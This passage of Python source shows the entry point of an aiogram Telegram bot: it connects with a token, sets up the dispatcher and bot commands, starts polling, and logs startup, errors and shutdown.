        token=BOT_TOKEN,
        session=session,
        default=DefaultBotProperties(parse_mode=ParseMode.HTML),
    )

    try:
        me = await bot.get_me()
        log.info(f"connected: @{me.username} | {me.id}")
        database.config["bot_username"] = me.username
    except Exception as e:
        log.critical(f"connection failed: {e}")
        await bot.session.close()
        sys.exit(1)

    storage = MemoryStorage()
    dp = Dispatcher(storage=storage)
    dp.include_router(router)

    await set_commands(bot)

    log.info("=" * 55)
    log.info(f"{BOT_NAME} is running")
    log.info("=" * 55)

    try:
        await bot.delete_webhook(drop_pending_updates=True)
        await dp.start_polling(bot, allowed_updates=dp.resolve_used_update_types())
    except (KeyboardInterrupt, SystemExit):
        log.info("stopping...")
    finally:
        try:
            await bot.session.close()
        except Exception:
            pass
        log.info("done")


def main():
    try:
        asyncio.run(main_async())
    except KeyboardInterrupt:
        log.info("interrupted")
    except Exception as e:
        log.critical(f"fatal: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
